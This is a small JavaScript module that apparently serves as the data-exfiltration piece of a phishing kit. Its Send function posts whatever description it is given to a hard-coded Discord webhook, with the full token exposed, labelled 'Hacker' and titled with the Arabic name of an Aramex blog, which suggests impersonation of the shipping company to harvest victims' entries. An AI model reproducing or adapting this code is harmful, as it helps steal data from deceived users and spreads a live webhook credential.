import axios from 'axios';


const TeleSned = () => {
     
    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة اراميكس ",
              description: des,
           },
          ],
    };

        await axios.post("https://discord.com/api/webhooks/1280208202859806854/kkoDvhqfrYJHfTtLaRK7XBXi3qSEIbpNf5srs14f34Fh5vKMMex5bClNeuDAMJVGYZMs",body) 
    }
  return {
    Send,
}
}

export default TeleSned;
